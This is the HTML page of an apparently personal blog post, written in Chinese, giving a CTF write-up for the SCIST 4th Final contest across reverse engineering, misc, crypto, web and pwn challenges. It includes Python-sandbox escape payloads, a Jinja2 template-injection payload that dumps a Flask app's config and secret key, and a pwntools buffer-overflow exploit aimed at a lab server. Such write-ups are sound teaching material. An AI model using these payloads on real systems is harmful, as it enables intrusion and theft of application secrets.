@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="7th place2730 points Rev PeekMe把點進去看起來像主要內容的函式改名字 peekme_main發現是 rust 寫的，難怪看起來不太一樣把點進去像是選單的函式改名字 menu點看到的部份flag看到完整flag TinyEncryptor會讀明文的每個字元，加 1 再 xor 0xA9 變成密文解密12345678910111213141516def decrypt_f">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SCIST 4th Final CTF   WriteUp">
+<meta property="og:url" content="http://example.com/2024/07/17/SCIST-4th-Final-CTF-WriteUp/index.html">
+<meta property="og:site_name" content="wang&#39;s blog">
+<meta property="og:description" content="7th place2730 points Rev PeekMe把點進去看起來像主要內容的函式改名字 peekme_main發現是 rust 寫的，難怪看起來不太一樣把點進去像是選單的函式改名字 menu點看到的部份flag看到完整flag TinyEncryptor會讀明文的每個字元，加 1 再 xor 0xA9 變成密文解密12345678910111213141516def decrypt_f">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/H16DVVTP0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Hkx9rNav0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJDBLETwC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJelPNavC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJcmwVaPC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BydQdNpDR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/r1RIcEaDR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ryqS34pvC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1TRgB6wA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BkdULBpwR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1sEDHTvR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJ83OSTPA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkMxKB6wA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/r1gJcrpPR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJj3qBpwA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S15jfUpw0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HkZU4U6PA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ByieS86w0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJACOI6DR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BkpoTIawA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rywUAIawA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkSPkPTwA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJ1K-vpwC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJVhmw6vC.png">
+<meta property="article:published_time" content="2024-07-16T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-28T19:10:40.915Z">
+<meta property="article:author" content="wang">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="SCIST">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/H16DVVTP0.png">
+    
+    
+    <!-- title -->
+    <title>SCIST 4th Final CTF   WriteUp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-86660611-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-86660611-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tag/">Tag</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/08/18/AIS3-Junior-2024-Web-Security-Walkthrough/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/06/05/AIS3-Pre-exam-MyFirstCTF-WriteUp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/07/17/SCIST-4th-Final-CTF-WriteUp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/07/17/SCIST-4th-Final-CTF-WriteUp/&text=SCIST 4th Final CTF   WriteUp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/07/17/SCIST-4th-Final-CTF-WriteUp/&title=SCIST 4th Final CTF   WriteUp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/07/17/SCIST-4th-Final-CTF-WriteUp/&is_video=false&description=SCIST 4th Final CTF   WriteUp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SCIST 4th Final CTF   WriteUp&body=Check out this article: http://example.com/2024/07/17/SCIST-4th-Final-CTF-WriteUp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/07/17/SCIST-4th-Final-CTF-WriteUp/&title=SCIST 4th Final CTF   WriteUp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/07/17/SCIST-4th-Final-CTF-WriteUp/&title=SCIST 4th Final CTF   WriteUp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/07/17/SCIST-4th-Final-CTF-WriteUp/&title=SCIST 4th Final CTF   WriteUp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/07/17/SCIST-4th-Final-CTF-WriteUp/&title=SCIST 4th Final CTF   WriteUp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/07/17/SCIST-4th-Final-CTF-WriteUp/&name=SCIST 4th Final CTF   WriteUp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/07/17/SCIST-4th-Final-CTF-WriteUp/&t=SCIST 4th Final CTF   WriteUp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Rev"><span class="toc-number">1.</span> <span class="toc-text">Rev</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#misc"><span class="toc-number">2.</span> <span class="toc-text">misc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crypto"><span class="toc-number">3.</span> <span class="toc-text">crypto</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web"><span class="toc-number">4.</span> <span class="toc-text">web</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwn"><span class="toc-number">5.</span> <span class="toc-text">Pwn</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        SCIST 4th Final CTF   WriteUp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wang</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-07-16T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-07-17</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/SCIST/" rel="tag">SCIST</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>7th place<br>2730 points</p>
+<h3 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h3><ul>
+<li>PeekMe<br><img src="https://hackmd.io/_uploads/H16DVVTP0.png" alt="image"><br>把點進去看起來像主要內容的函式改名字 peekme_main<br><img src="https://hackmd.io/_uploads/Hkx9rNav0.png" alt="image"><br>發現是 rust 寫的，難怪看起來不太一樣<br><img src="https://hackmd.io/_uploads/HJDBLETwC.png" alt="image"><br>把點進去像是選單的函式改名字 menu<br><img src="https://hackmd.io/_uploads/HJelPNavC.png" alt="image"><br>點看到的部份flag<br><img src="https://hackmd.io/_uploads/HJcmwVaPC.png" alt="image"><br>看到完整flag</li>
+<li>TinyEncryptor<br><img src="https://hackmd.io/_uploads/BydQdNpDR.png" alt="image"><br>會讀明文的每個字元，加 1 再 xor 0xA9 變成密文<br>解密<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_file</span>(<span class="params">input_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f_in:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            byte = f_in.read(<span class="number">1</span>)  </span><br><span class="line">            <span class="comment"># print(byte)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> byte:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            dec_byte = <span class="built_in">ord</span>(byte) ^ <span class="number">0xA9</span>  </span><br><span class="line">            dec_byte -= <span class="number">1</span>  </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(dec_byte), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">              </span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">input_file = <span class="string">&#x27;encrypted.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">decrypt_file(input_file)</span><br></pre></td></tr></table></figure>
+<img src="https://hackmd.io/_uploads/r1RIcEaDR.png" alt="image"></li>
+</ul>
+<h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><ul>
+<li>pyjail1<br>發現 <code>breakpoint()</code> 剛好不在黑名單中</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/ryqS34pvC.png" alt="image"></p>
+<ul>
+<li>pyjail2<br>應該要使 <code>&#123;inp&#125;</code> 變成 <code>&quot;fg&quot;</code><br>發現 <code>c h r () + =</code> 剛好不在黑名單中</li>
+</ul>
+<p>想辦法用這幾個字元組成<code>&quot;fg&quot;</code>&#x3D;&gt;<code>chr(102)+chr(103)</code><br>經過<del>一波三折</del>查詢發現 <code>+(()==())</code> 會是 1<br>所以payload就是<code>chr( 102個+(()==()) )+chr( 103個+(()==()) )</code><br><img src="https://hackmd.io/_uploads/B1TRgB6wA.png" alt="image"></p>
+<h3 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h3><ul>
+<li>Affine<br><img src="https://hackmd.io/_uploads/BkdULBpwR.png" alt="image"><br>PARAGRAPH 仿射加密七次變成 text，每次a、b都是隨機<br>但 text 與 PARAGRAPH 的關係仍然是仿射加密，找線上工具 <a target="_blank" rel="noopener" href="https://quipqiup.com/">https://quipqiup.com/</a><br>還原出部分<code>GEffUFISh, afSo kRocR aS SEa jEffIES, arE thE OEDuSa-phaSE oF CErtaIR BEfatIRouS OEOlErS oF thE SulphUfuO MEDuSozoa, chICh IS a Oajor part oF thE phUfuO vRIDarIa.</code><br>用人工智慧把常見的單字都解出來<br><img src="https://hackmd.io/_uploads/H1sEDHTvR.png" alt="image"><br>得到 <code>Guffufish, also known as sea jellies, are the medusa-phase of certain gelatinous members of the class Scyphozoa, which is a major part of the phylum Cnidaria.</code></li>
+</ul>
+<p>用<code>工人智慧</code>盡可能解出還不確定的單字<br><img src="https://hackmd.io/_uploads/BJ83OSTPA.png" alt="image"><br><img src="https://hackmd.io/_uploads/rkMxKB6wA.png" alt="image"><br>問號就是無法從已知的對照出來的字母<br>再用人工智慧解出剩下<br><img src="https://hackmd.io/_uploads/r1gJcrpPR.png" alt="image"><br>得到<code>Jellyfish, also known as sea jellies, are the medusa-phase of certain gelatinous members of the subphylum Medusozoa, which is a major part of the phylum Cnidaria.</code><br>雜湊<br><img src="https://hackmd.io/_uploads/rJj3qBpwA.png" alt="image"></p>
+<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><ul>
+<li>formatter<br>看 main.py 推測要 SSTI 並繞過 <code>&#123;&#123; &#125;&#125; . ()</code> 取得 app.secret_key</li>
+</ul>
+<p><code>&#123;% print ... %&#125;</code>繞過<code>&#123;&#123; &#125;&#125;</code><br>避免用類似<code>&#39;&#39;.__class__</code>，改用類似<code>&#39;&#39;[&#39;__class__&#39;]</code><br>上網查 繞過小括號並取得 config 相關的SSTI payload<br><a target="_blank" rel="noopener" href="https://christa.top/details/44/">https://christa.top/details/44/</a><br><img src="https://hackmd.io/_uploads/S15jfUpw0.png" alt="image"></p>
+<p>改一下，先測試<code>&#123;% print url_for['__globals__'] %&#125;</code>發現有成功執行但沒有<code>&#39;current_app&#39;</code><br>再測試<code>&#123;% print get_flashed_messages['__globals__'] %&#125;</code>，有<code>&#39;current_app&#39;</code><br><img src="https://hackmd.io/_uploads/HkZU4U6PA.png" alt="image"><br>最後payload <code>&#123;% print get_flashed_messages['__globals__']['current_app']['config'] %&#125;</code><br><img src="https://hackmd.io/_uploads/ByieS86w0.png" alt="image"></p>
+<h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><ul>
+<li>Bank<br>看到後門，推測是 ret2text<br><img src="https://hackmd.io/_uploads/HJACOI6DR.png" alt="image"><br>r2 靜態分析<br><img src="https://hackmd.io/_uploads/BkpoTIawA.png" alt="image"><br>推測 [var_14h] 是 length<br><img src="https://hackmd.io/_uploads/rywUAIawA.png" alt="image"><br>推測 [var_10h] 是 name<br>length 輸入一個小於 16 的數字，name 做 buffer overflow<br><img src="https://hackmd.io/_uploads/rkSPkPTwA.png" alt="image"><br>name 距離 rbp 16 bytes，所以payload先填 16 個 a<br>再填 8 個 a 覆蓋掉 saved rbp<br><img src="https://hackmd.io/_uploads/BJ1K-vpwC.png" alt="image"><br>ret address 填 sym.bad_dog 裡面的 0x00401243 ，因為 saved rbp 被覆蓋掉了，要跳過 prologue<br>寫 exploit<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&quot;./Bank&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;lab.scist.org&quot;</span>, <span class="number">37000</span>)</span><br><span class="line"></span><br><span class="line">raw_input(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;length of name:\n&gt; &quot;</span>, <span class="string">b&quot;15&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;name:\n&gt; &quot;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0x00401243</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<img src="https://hackmd.io/_uploads/BJVhmw6vC.png" alt="image"></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tag/">Tag</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Rev"><span class="toc-number">1.</span> <span class="toc-text">Rev</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#misc"><span class="toc-number">2.</span> <span class="toc-text">misc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crypto"><span class="toc-number">3.</span> <span class="toc-text">crypto</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web"><span class="toc-number">4.</span> <span class="toc-text">web</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwn"><span class="toc-number">5.</span> <span class="toc-text">Pwn</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/07/17/SCIST-4th-Final-CTF-WriteUp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/07/17/SCIST-4th-Final-CTF-WriteUp/&text=SCIST 4th Final CTF   WriteUp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/07/17/SCIST-4th-Final-CTF-WriteUp/&title=SCIST 4th Final CTF   WriteUp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/07/17/SCIST-4th-Final-CTF-WriteUp/&is_video=false&description=SCIST 4th Final CTF   WriteUp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SCIST 4th Final CTF   WriteUp&body=Check out this article: http://example.com/2024/07/17/SCIST-4th-Final-CTF-WriteUp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/07/17/SCIST-4th-Final-CTF-WriteUp/&title=SCIST 4th Final CTF   WriteUp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/07/17/SCIST-4th-Final-CTF-WriteUp/&title=SCIST 4th Final CTF   WriteUp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/07/17/SCIST-4th-Final-CTF-WriteUp/&title=SCIST 4th Final CTF   WriteUp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/07/17/SCIST-4th-Final-CTF-WriteUp/&title=SCIST 4th Final CTF   WriteUp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/07/17/SCIST-4th-Final-CTF-WriteUp/&name=SCIST 4th Final CTF   WriteUp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/07/17/SCIST-4th-Final-CTF-WriteUp/&t=SCIST 4th Final CTF   WriteUp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    wang
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tag/">Tag</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
